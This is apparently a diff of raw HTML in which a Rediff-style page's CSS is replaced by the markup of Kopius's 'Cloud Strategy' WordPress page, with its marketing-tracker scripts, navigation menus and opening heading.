+			m=d.getElementsByTagName('script')[0];a.async=1;
+			a.src='https://agent.marketingcloudfx.com/mcfx.js';m.parentNode.insertBefore(a, m);
+		})(window, document, 'mcfx');
+		mcfx('create','15989');
+	</script>
+	<!-- MCFX - CallTrackerFX -->
+	<script type="text/javascript" src="//cdn.leadmanagerfx.com/phone/js/15989" data-registered="mcfx-plugin" async ></script>
+	<!-- Helper Script -->
+	<script type='text/javascript' data-registered="mcfx-plugin" >
+		/* global mcfx */
+		window.mcfxCaptureCustomFormData = function( data, formId='form-from-mcfxCaptureCustomFormData' ) {
+			const formEl = document.createElement('form');
+			formEl.id = formId;
+			for ( const field of data ) {
+				const fieldEl = document.createElement('input');
+				fieldEl.type = 'hidden';
+				for ( const key in field ) {
+					fieldEl[key] = field[key];
+				}
+				formEl.appendChild(fieldEl);
+			}
+			mcfx( 'capture', formEl );
+		}
+	</script>
+<!-- --------- END PLUGIN MARKETINGCLOUDFX-WP - HEADER SCRIPTS --------- -->
 
-            .sub_email_in {
-                display: block;
-                margin: 3px 0 5px 0;
-                box-sizing: border-box;
-                font-size: 14px;
-                padding: 3px;
-                width: 99%;
-                outline: none;
-                border: solid 1px #cecece
-            }
+<link rel="alternate" href="https://kopiustech.com/capabilities/cloud-strategy/" hreflang="en"/>
+<link rel="alternate" href="https://kopiustech.com/es/capabilities/cloud-strategy/" hreflang="es"/>
+		<script>
+			document.documentElement.className = document.documentElement.className.replace( 'no-js', 'js' );
+		</script>
+				<style>
+			.no-js img.lazyload { display: none; }
+			figure.wp-block-image img.lazyloading { min-width: 150px; }
+							.lazyload, .lazyloading { opacity: 0; }
+				.lazyloaded {
+					opacity: 1;
+					transition: opacity 400ms;
+					transition-delay: 0ms;
+				}
+					</style>
+		<link rel="icon" href="https://kopiustech.com/wp-content/uploads/2023/02/cropped-Kopius-Site-Icon-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://kopiustech.com/wp-content/uploads/2023/02/cropped-Kopius-Site-Icon-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://kopiustech.com/wp-content/uploads/2023/02/cropped-Kopius-Site-Icon-180x180.png" />
+<meta name="msapplication-TileImage" content="https://kopiustech.com/wp-content/uploads/2023/02/cropped-Kopius-Site-Icon-270x270.png" />
+		<style id="wp-custom-css">
+			header[theme][theme=neutral], [data-automation-id=city], [data-automation-id=state] {
+	display: none;
+}
 
-            .subscribe_btn_in {
-                background: #0377c0;
-                color: #fff;
-                border: solid 1px #0377c0;
-                letter-spacing: 0.5px;
-                font-weight: bold;
-                cursor: pointer;
-                border-radius: 5px;
-                font-size: 13px;
-                padding: 3px 10px;
-            }
+#wp-megamenu-item-3640 a{    
+	padding: 12px 22px !important;
+	margin-left: 4px;
+    border: 0 !important;
+    border-radius: 80px !important;
+    color: #fff !important;
+    background: black !important;
+    position: relative;
+    z-index: 1; }
 
-            .subscribe_btn_in:hover {
-                background: #02639d;
-            }
+#wp-megamenu-item-3640 a:hover{    
+	padding: 12px 22px !important;
+	margin-left: 4px;
+    border: 0 !important;
+    border-radius: 80px !important;
+    color: #fff !important;
+    background: #222222 !important;
+    position: relative;
+    z-index: 1; }		</style>
+		
+	<script src="https://www.twilik.com/assets/retainable/rss-embed/retainable-rss-embed.js"></script>
 
-            .cancel_btn {
-                color: #0055cc;
-                font-size: 14px;
-                cursor: pointer;
-                font-weight: normal;
-                vertical-align: middle;
-                display: inline-block;
-                margin: 0 0 0 5px;
-            }
+  	<script src="https://kenwheeler.github.io/slick/slick/slick.js"></script>
 
-            .subwait {
-                display: inline-block;
-                ;width: 30px;
-                height: 30px;
-                background: url('https://imworld.rediff.com/worldrediff/pix/waitimg.gif') no-repeat 50% 50%;
-                vertical-align: middle;
-                visibility: hidden;
-            }
+	<script src="https://boards.greenhouse.io/embed/job_board/js?for=valence"></script>
 
-            .div_err_message {
-                display: none;
-                margin: 5px 15px;
-                font-size: 14px;
-                color: #ff2020;
-            }
+</head>
 
-            .div_thanks {
-                display: none;
-                margin: 30px 0;
-                text-align: center;
-                font-size: 15px;
-                font-weight: bold;
-                color: #006600;
-            }
+<body class="page-template-default page page-id-843 page-child parent-pageid-311 wp-custom-logo wp-megamenu no-sidebar">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-dark-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0.498039215686" /><feFuncG type="table" tableValues="0 0.498039215686" /><feFuncB type="table" tableValues="0 0.498039215686" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.549019607843 0.988235294118" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.717647058824 0.254901960784" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-red"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 0.278431372549" /><feFuncB type="table" tableValues="0.592156862745 0.278431372549" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-midnight"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0" /><feFuncG type="table" tableValues="0 0.647058823529" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-magenta-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.780392156863 1" /><feFuncG type="table" tableValues="0 0.949019607843" /><feFuncB type="table" tableValues="0.352941176471 0.470588235294" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-green"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.650980392157 0.403921568627" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.447058823529 0.4" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-orange"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.0980392156863 1" /><feFuncG type="table" tableValues="0 0.662745098039" /><feFuncB type="table" tableValues="0.847058823529 0.419607843137" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg>
+<!-- GTM Container placement set to automatic -->
+<!-- Google Tag Manager (noscript) -->
+				<noscript><iframe  height="0" width="0" style="display:none;visibility:hidden" aria-hidden="true" data-src="https://www.googletagmanager.com/ns.html?id=GTM-WTPDTBR" class="lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></noscript>
+<!-- End Google Tag Manager (noscript) --><div id="page" class="site">
+	<a class="skip-link screen-reader-text" href="#primary">Skip to content</a>
 
-            .bmailicon:after {
-                display: none;
-            }
+	<header id="masthead" class="site-header">
+		<div class="site-branding">
+			<a href="https://kopiustech.com/" class="custom-logo-link" rel="home"><img width="1140" height="280"   alt="Kopius" decoding="async" data-srcset="https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark.png 1140w, https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark-300x74.png 300w, https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark-1024x252.png 1024w, https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark-768x189.png 768w"  data-src="https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark.png" data-sizes="(max-width: 1140px) 100vw, 1140px" class="custom-logo lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img width="1140" height="280" src="https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark.png" class="custom-logo" alt="Kopius" decoding="async" srcset="https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark.png 1140w, https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark-300x74.png 300w, https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark-1024x252.png 1024w, https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark-768x189.png 768w" sizes="(max-width: 1140px) 100vw, 1140px" /></noscript></a>				<p class="site-title"><a href="https://kopiustech.com/" rel="home">Kopius</a></p>
+						</div><!-- .site-branding -->
 
-            .backgurus {
-                background: #009dfe !important;
-                position: relative;
-            }
+		<nav id="site-navigation" class="main-navigation">
+			<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">Primary Menu</button>
+			<nav id="wp-megamenu-menu-1" class="wp-megamenu-wrap   ">
+			<div class="wpmm-fullwidth-wrap"></div>
+			<div class="wpmm-nav-wrap wpmm-main-wrap-menu-1">
+				<a href="javascript:;" class="wpmm_mobile_menu_btn show-close-icon"><i class="fa fa-bars"></i> </a> 
+					<ul id="menu-main-menu" class="wp-megamenu" ><li id="wp-megamenu-item-2776" class="menu-item menu-item-type-post_type menu-item-object-page wp-megamenu-item-2776  wpmm_dropdown_menu  wpmm-none wpmm-item-fixed-width wpmm-strees-default wpmm-submenu-right"><a href="https://kopiustech.com/approach/">Approach</a></li>
+<li id="wp-megamenu-item-2896" class="menu-item menu-item-type-post_type menu-item-object-page current-page-ancestor wp-megamenu-item-2896  wpmm_mega_menu  wpmm-none wpmm-hide-desktop wpmm-submenu-right"><a href="https://kopiustech.com/capabilities/">Capabilities <b class="fa fa-angle-down"></b> </a>
+<ul class="wp-megamenu-sub-menu" >
+	<li id="wp-megamenu-item-464239883485841925" class="wpmm-row wp-megamenu-item-464239883485841925 wpmm-submenu-right">
+	<ul class="wp-megamenu-sub-menu" >
+		<li id="wp-megamenu-item-3161589941281115767" class="wpmm-col wpmm-col-12 wp-megamenu-item-3161589941281115767 wpmm-submenu-right">
+		<ul class="wp-megamenu-sub-menu" >
+			<li class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2896 wpmm-hide-desktop wpmm-submenu-right"><div class="menu-overview-what-we-do-container"><ul id="menu-overview-what-we-do" class="menu"><li id="menu-item-2514" class="menu-item menu-item-type-post_type menu-item-object-page current-page-ancestor menu-item-2514"><a href="https://kopiustech.com/capabilities/" data-ps2id-api="true">Capabilities Overview</a></li>
+</ul></div></li>
+			<li id="wp-megamenu-item-2897" class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2897 wpmm-submenu-right"><h4 class="wpmm-item-title">Digital Experiences + Strategy</h4><div class="menu-strategy-dd-container"><ul id="menu-strategy-dd" class="menu"><li id="menu-item-2676" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2676"><a href="https://kopiustech.com/capabilities/lean-transformation-roadmaps/" data-ps2id-api="true">Lean Transformation Roadmaps </a></li>
+<li id="menu-item-2677" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2677"><a href="https://kopiustech.com/capabilities/digital-product-planning/" data-ps2id-api="true">Digital Product Planning</a></li>
+<li id="menu-item-879" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-879"><a href="https://kopiustech.com/capabilities/customer-experience/" data-ps2id-api="true">Customer Experience</a></li>
+<li id="menu-item-2920" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2920"><a href="https://kopiustech.com/capabilities/value-definition/" data-ps2id-api="true">Value Definition</a></li>
+<li id="menu-item-881" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-843 current_page_item menu-item-881"><a href="https://kopiustech.com/capabilities/cloud-strategy/" aria-current="page" data-ps2id-api="true">Cloud Strategy</a></li>
+</ul></div></li>
+			<li id="wp-megamenu-item-2898" class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2898 wpmm-submenu-right"><h4 class="wpmm-item-title">Labs + Technology</h4><div class="menu-technology-dd-container"><ul id="menu-technology-dd" class="menu"><li id="menu-item-2688" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2688"><a href="https://kopiustech.com/capabilities/data-and-analytics/" data-ps2id-api="true">Data + Analytics</a></li>
+<li id="menu-item-2686" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2686"><a href="https://kopiustech.com/capabilities/artificial-intelligence-machine-learning/" data-ps2id-api="true">AI/ML</a></li>
+<li id="menu-item-2690" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2690"><a href="https://kopiustech.com/capabilities/cloud-application-development/" data-ps2id-api="true">Cloud Application Development</a></li>
+<li id="menu-item-2940" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2940"><a href="https://kopiustech.com/capabilities/dxp-architecture-solution-development/" data-ps2id-api="true">DXP Architecture + Solution Development </a></li>
+<li id="menu-item-2950" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2950"><a href="https://kopiustech.com/capabilities/cloud-engineering/" data-ps2id-api="true">Cloud Engineering</a></li>
+</ul></div></li>
+			<li id="wp-megamenu-item-2899" class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2899 wpmm-submenu-right"><h4 class="wpmm-item-title">Operational Services</h4><div class="menu-services-dd-container"><ul id="menu-services-dd" class="menu"><li id="menu-item-2699" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2699"><a href="https://kopiustech.com/capabilities/strategic-technical-capacity/" data-ps2id-api="true">Strategic Technical Capacity</a></li>
+<li id="menu-item-2921" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2921"><a href="https://kopiustech.com/capabilities/devops/" data-ps2id-api="true">DevOps</a></li>
+<li id="menu-item-2697" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2697"><a href="https://kopiustech.com/capabilities/project-leadership/" data-ps2id-api="true">Project Leadership</a></li>
+<li id="menu-item-2696" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2696"><a href="https://kopiustech.com/capabilities/managed-services/" data-ps2id-api="true">Managed Services  </a></li>
+<li id="menu-item-2698" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2698"><a href="https://kopiustech.com/capabilities/quality-assurance-and-testing/" data-ps2id-api="true">Quality Assurance + Testing</a></li>
+</ul></div></li>
+		</ul>
+</li>
+	</ul>
+</li>
+</ul>
+</li>
+<li id="wp-megamenu-item-2680" class="menu-item menu-item-type-post_type menu-item-object-page current-page-ancestor wp-megamenu-item-2680  wpmm_mega_menu  wpmm-none wpmm-item-fixed-width wpmm-strees-default wpmm-hide-mobile wpmm-submenu-right"><a href="https://kopiustech.com/capabilities/">Capabilities <b class="fa fa-angle-down"></b> </a>
+<ul class="wp-megamenu-sub-menu" >
+	<li id="wp-megamenu-item-4341728754778040147" class="wpmm-row wp-megamenu-item-4341728754778040147 wpmm-submenu-right">
+	<ul class="wp-megamenu-sub-menu" >
+		<li id="wp-megamenu-item-1.24869995022E+19" class="wpmm-col wpmm-col-12 wp-megamenu-item-1.24869995022E+19 wpmm-submenu-right">
+		<ul class="wp-megamenu-sub-menu" >
+			<li class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2680 wpmm-hide-mobile wpmm-submenu-right"><div class="menu-overview-what-we-do-container"><ul id="menu-overview-what-we-do-1" class="menu"><li class="menu-item menu-item-type-post_type menu-item-object-page current-page-ancestor menu-item-2514"><a href="https://kopiustech.com/capabilities/" data-ps2id-api="true">Capabilities Overview</a></li>
+</ul></div></li>
+		</ul>
+</li>
+	</ul>
+</li>
+	<li id="wp-megamenu-item-3337531221288372493" class="wpmm-row wp-megamenu-item-3337531221288372493 wpmm-submenu-right">
+	<ul class="wp-megamenu-sub-menu" >
+		<li id="wp-megamenu-item-3498102419177209205" class="wpmm-col wpmm-col-4 wp-megamenu-item-3498102419177209205 wpmm-submenu-right">
+		<ul class="wp-megamenu-sub-menu" >
+			<li class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2680 wpmm-hide-mobile wpmm-submenu-right"><h4 class="wpmm-item-title">Digital Experiences + Strategy</h4><div class="menu-strategy-dd-container"><ul id="menu-strategy-dd-1" class="menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2676"><a href="https://kopiustech.com/capabilities/lean-transformation-roadmaps/" data-ps2id-api="true">Lean Transformation Roadmaps </a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2677"><a href="https://kopiustech.com/capabilities/digital-product-planning/" data-ps2id-api="true">Digital Product Planning</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-879"><a href="https://kopiustech.com/capabilities/customer-experience/" data-ps2id-api="true">Customer Experience</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2920"><a href="https://kopiustech.com/capabilities/value-definition/" data-ps2id-api="true">Value Definition</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-843 current_page_item menu-item-881"><a href="https://kopiustech.com/capabilities/cloud-strategy/" aria-current="page" data-ps2id-api="true">Cloud Strategy</a></li>
+</ul></div></li>
+		</ul>
+</li>
+		<li id="wp-megamenu-item-1.20457131269E+19" class="wpmm-col wpmm-col-4 wp-megamenu-item-1.20457131269E+19 wpmm-submenu-right">
+		<ul class="wp-megamenu-sub-menu" >
+			<li class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2680 wpmm-hide-mobile wpmm-submenu-right"><h4 class="wpmm-item-title">Labs + Technology</h4><div class="menu-technology-dd-container"><ul id="menu-technology-dd-1" class="menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2688"><a href="https://kopiustech.com/capabilities/data-and-analytics/" data-ps2id-api="true">Data + Analytics</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2686"><a href="https://kopiustech.com/capabilities/artificial-intelligence-machine-learning/" data-ps2id-api="true">AI/ML</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2690"><a href="https://kopiustech.com/capabilities/cloud-application-development/" data-ps2id-api="true">Cloud Application Development</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2940"><a href="https://kopiustech.com/capabilities/dxp-architecture-solution-development/" data-ps2id-api="true">DXP Architecture + Solution Development </a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2950"><a href="https://kopiustech.com/capabilities/cloud-engineering/" data-ps2id-api="true">Cloud Engineering</a></li>
+</ul></div></li>
+		</ul>
+</li>
+		<li id="wp-megamenu-item-8222468906024073272" class="wpmm-col wpmm-col-4 wp-megamenu-item-8222468906024073272 wpmm-submenu-right">
+		<ul class="wp-megamenu-sub-menu" >
+			<li class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2680 wpmm-hide-mobile wpmm-submenu-right"><h4 class="wpmm-item-title">Operational Services</h4><div class="menu-services-dd-container"><ul id="menu-services-dd-1" class="menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2699"><a href="https://kopiustech.com/capabilities/strategic-technical-capacity/" data-ps2id-api="true">Strategic Technical Capacity</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2921"><a href="https://kopiustech.com/capabilities/devops/" data-ps2id-api="true">DevOps</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2697"><a href="https://kopiustech.com/capabilities/project-leadership/" data-ps2id-api="true">Project Leadership</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2696"><a href="https://kopiustech.com/capabilities/managed-services/" data-ps2id-api="true">Managed Services  </a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2698"><a href="https://kopiustech.com/capabilities/quality-assurance-and-testing/" data-ps2id-api="true">Quality Assurance + Testing</a></li>
+</ul></div></li>
+		</ul>
+</li>
+	</ul>
+</li>
+</ul>
+</li>
+<li id="wp-megamenu-item-441" class="menu-item menu-item-type-post_type menu-item-object-page wp-megamenu-item-441  wpmm_dropdown_menu  wpmm-none wpmm-item-fixed-width wpmm-strees-default wpmm-submenu-right"><a href="https://kopiustech.com/our-work/">Case Studies</a></li>
+<li id="wp-megamenu-item-2678" class="menu-item menu-item-type-post_type menu-item-object-page wp-megamenu-item-2678  wpmm_mega_menu  wpmm-none wpmm-item-fixed-width wpmm-strees-default wpmm-submenu-right"><a href="https://kopiustech.com/about-us/">About Us <b class="fa fa-angle-down"></b> </a>
+<ul class="wp-megamenu-sub-menu" >
+	<li id="wp-megamenu-item-5917381879845029752" class="wpmm-row wp-megamenu-item-5917381879845029752 wpmm-submenu-right">
+	<ul class="wp-megamenu-sub-menu" >
+		<li id="wp-megamenu-item-7413910049027223042" class="wpmm-col wpmm-col-12 wp-megamenu-item-7413910049027223042 wpmm-submenu-right">
+		<ul class="wp-megamenu-sub-menu" >
+			<li class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2678 wpmm-submenu-right"><div class="menu-about-container"><ul id="menu-about" class="menu"><li id="menu-item-2521" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2521"><a href="https://kopiustech.com/about-us/" data-ps2id-api="true">Company</a></li>
+<li id="menu-item-562" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-562"><a href="https://kopiustech.com/about-us/our-team/" data-ps2id-api="true">Team</a></li>
+<li id="menu-item-3187" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3187"><a href="https://kopiustech.com/about-us/our-partners/" data-ps2id-api="true">Platforms + Partners</a></li>
+<li id="menu-item-2542" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2542"><a href="https://kopiustech.com/contact-us/" data-ps2id-api="true">Contact</a></li>
+</ul></div></li>
+		</ul>
+</li>
+	</ul>
+</li>
+</ul>
+</li>
+<li id="wp-megamenu-item-477" class="menu-item menu-item-type-post_type menu-item-object-page wp-megamenu-item-477  wpmm_dropdown_menu  wpmm-none wpmm-submenu-right"><a href="https://kopiustech.com/insights-innovation/">Insights</a></li>
+<li id="wp-megamenu-item-2567" class="menu-item menu-item-type-post_type menu-item-object-page wp-megamenu-item-2567  wpmm_dropdown_menu  wpmm-none wpmm-submenu-right"><a href="https://kopiustech.com/careers/">Careers</a></li>
+<li id="wp-megamenu-item-3640" class="menu-item menu-item-type-post_type menu-item-object-page wp-megamenu-item-3640  wpmm_dropdown_menu  wpmm-none wpmm-submenu-right"><a href="https://kopiustech.com/contact-us/">Contact Us</a></li>
+<li id="wp-megamenu-item-3642" class="weglot-parent-menu-item weglot-lang menu-item-weglot weglot-language en menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children wp-megamenu-item-3642  wpmm_dropdown_menu  wpmm-none wpmm-submenu-right"><a title="English" href="#weglot_switcher">EN <b class="fa fa-angle-down"></b> </a>
+<ul class="wp-megamenu-sub-menu" >
+	<li id="wp-megamenu-item-weglot-3642-es" class="weglot-lang menu-item-weglot weglot-language weglot-es menu-item menu-item-type-custom menu-item-object-custom wp-megamenu-item-weglot-3642-es wpmm-submenu-right"><a title="Español" href="https://kopiustech.com/es/capabilities/cloud-strategy/">ES</a></li>
+</ul>
+</li>
+</ul>
+			</div>
 
-            .backgurus::after {
-                content: 'new';
-                position: absolute;
-                color: #db0606;
-                font-size: 12px;
-                height: 12px;
-                line-height: 10px;
-                right: -32px;
-                font-family: 'arial','Muli';
-                font-weight: bold;
-            }
 
-            .secstorybox.rediffgurus h3 {
-                border-bottom: solid 2px #009dfe;
-                color: #009dfe;
-            }
+			
+		    
+		</nav>			<section class="search-container">
+				<div id="header-search">
+					<div class="search-form">
+  <input type="checkbox" id="checkTab" name="checkTab"> 
+  <label class="search-icon" for="checkTab">
+    <span class="icon"></span>
+  </label>
+  <div class="tabs">
+    <div class="nav-box">
+      <form role="search"  method="get" action="https://kopiustech.com/">
 
-            .secstorybox.rediffgurus h2:before,.secstorybox h2.rediffgurus:before {
-                background: #009dfe;
-            }
+        <span class="sr-only">Search for:</span>
+        <span class="icon"></span>
+        <input type="search" class="search-field" placeholder="Search&hellip;" value="" name="s">
+        <button type="submit" class="search-submit">Search</button>
+      </form>
+    </div>
+  </div>
+</div>
+				</div>
+			</section>
+		</nav><!-- #site-navigation -->
+	</header><!-- #masthead -->
 
-            .rediffgurus h3:before {
-                background-position: -163px -132px;
-            }
+	<main id="primary" class="site-main">
 
-            .rediffgurus .morestory {
-                color: #009dfe;
-            }
+		
+<article id="post-843" class="post-843 page type-page status-publish hentry">
+	<header class="entry-header">
+		<h1 class="entry-title">Cloud Strategy</h1>	</header><!-- .entry-header -->
 
-            .amaz_adbox {
-                text-align: center;
-                margin: 5px 0 20px 0;
-            }
+	
+	<div class="entry-content">
+		
+<div><div class="crown-header center" style="background-image:url(https://kopiustech.com/wp-content/uploads/2023/03/iStock-1319893380-magentifyHDx-scaled.jpg);background-size:cover;background-position:center;background:bgColor"><div class="title"><h6 class="subtitle" style="color:#ffffff"><strong>Digital Experiences + Strategy</strong></h6><h2 class="collapsible" style="color:#ffffff">Cloud Strategy</h2></div><div class="divider"></div><div class="content"></div></div></div>
 
-            @media screen and (max-width: 1000px) {
-                .subnews_icon {
-                    display:none;
-                }
-            }
 
-            .div_corona {
-                border: none;
-                background: #e6f7ff;
-                border-radius: 3px;
-            }
 
-            .div_corona p:nth-child(1) {
-                width: 66px;
-                background: transparent;
-            }
+<div class="wp-block-getwid-section getwid-section-content-custom-width"><div class="wp-block-getwid-section__wrapper getwid-padding-left-normal getwid-padding-right-normal" style="padding-top:120px;padding-bottom:120px"><div class="wp-block-getwid-section__inner-wrapper" style="max-width:800px"><div class="wp-block-getwid-section__background-holder"><div class="wp-block-getwid-section__background"></div><div class="wp-block-getwid-section__foreground"></div></div><div class="wp-block-getwid-section__content"><div class="wp-block-getwid-section__inner-content">
+<h2 class="has-text-align-center">To the Cloud and Beyond</h2>
 
-            .div_corona p {
-                font-size: 0.90em;
-            }
 
-            .logobar {
-                padding-top: 10px;
-            }
-        </style>
-    </head>
-    <body>
-        <input type="hidden" id="OAS_subsection" name="OAS_subsection" value="home"/>
-        <style>
-            .fnt0 {
-                font-size: 0;
-            }
-        </style>
-        <div class="fnt0">
